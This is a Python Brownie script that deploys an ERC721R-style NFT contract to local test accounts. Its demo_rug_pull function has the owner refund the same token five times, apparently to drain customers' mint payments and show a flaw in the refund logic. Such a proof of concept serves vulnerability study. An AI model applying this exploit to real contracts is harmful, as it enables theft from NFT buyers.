from brownie import accounts, network, config, ERC721RExample as ERC721R
from web3 import Web3
from time import time
from collections import defaultdict


owner_acct = accounts[0]
customer_acct = accounts[1]


def deploy():
    contract = ERC721R.deploy(
        {"from": owner_acct},
        publish_source=config["networks"][network.show_active()].get("verify"),
    )
    print(f"Contract deployed to {contract.address}\n")


def toggle_sale_status():
    contract = ERC721R[-1]
    tx_1 = contract.togglePresaleStatus({"from": owner_acct})
    tx_2 = contract.togglePublicSaleStatus({"from": owner_acct})
    tx_1.wait(0.1)
    tx_2.wait(0.1)
    presale_active = contract.presaleActive()
    public_sale_active = contract.publicSaleActive()
    print(
        f"toggle finish, presale status: {presale_active}, public sale status: {public_sale_active}\n"
    )


def add_refund_period():
    contract = ERC721R[-1]
    contract.toggleRefundCountdown({"from": owner_acct})
    refund_end_time = contract.refundEndTime()
    print(f"refund end time: {refund_end_time}, now: {time()}")


def customer_mint():
    contract = ERC721R[-1]
    tx = contract.publicSaleMint(5, {"from": customer_acct, "value": "0.5 ether"})
    tx.wait(0.1)
    print("custmer mint successfully\n")


def owner_mint():
    contract = ERC721R[-1]
    tx = contract.ownerMint(1, {"from": owner_acct})
    tx.wait(0.1)
    print("owner mint successfully\n")


def customer_refund(token_id):
    contract = ERC721R[-1]
    tx = contract.refund([token_id], {"from": customer_acct})
    tx.wait(0.1)
    print(f"customer refund token id {token_id} successfully\n")


def owner_refund(token_id):
    contract = ERC721R[-1]
    tx = contract.refund([token_id], {"from": owner_acct})
    tx.wait(0.1)
    print(f"owner refund token id {token_id} successfully\n")


def get_nft_owner_map():
    owner_map = defaultdict(list)
    contract = ERC721R[-1]
    total_supply = contract.totalSupply()

    for i in range(0, total_supply):
        owner_map[contract.ownerOf(i)].append(i)

    return owner_map


def contract_status():
    contract = ERC721R[-1]
    owner_balance = contract.balanceOf(owner_acct)
    customer_balance = contract.balanceOf(customer_acct)
    print(
        f"owner's balance: {owner_balance} NFT\ncustomer's balance: {customer_balance} NFT"
    )

    balance = Web3.fromWei(contract.balance(), "ether")
    print(f"contract balance: {balance} ether")

    total_supply = contract.totalSupply()
    for i in range(0, total_supply):
        print(f"{i} token owner: {contract.ownerOf(i)}")

    print("\n")


def demo_rug_pull():
    deploy()

    toggle_sale_status()

    customer_mint()
    owner_mint()

    contract_status()

    nft_owner_map = get_nft_owner_map()

    for i in range(0, 5):
        owner_refund(nft_owner_map[owner_acct][0])

    contract_status()
